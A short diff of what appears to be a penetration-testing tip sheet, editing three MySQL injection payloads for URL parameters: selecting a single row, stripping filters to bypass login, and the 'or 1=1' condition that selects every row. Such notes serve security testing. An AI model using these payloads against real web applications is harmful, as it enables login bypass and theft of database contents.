@@ -17,11 +17,11 @@ Tips:
 - Use search filters in the web app to trigger this code.
 
 Select a test row:
-MySQL:    route?<key1>=<val1>' limit 1; -- -
+MySQL:    route?<key1>=<val1>' limit 1 --
 
 Eliminate additional filters (bypass login, etc.):
-MySQL:    route?<key1>=<val1>'; -- -
+MySQL:    route?<key1>=<val1>' --
 
 Select all rows (DANGER):
-MySQL:    route?<key1>=<val1>' or 1=1; -- -
+MySQL:    route?<key1>=<val1>' or 1=1 --
 
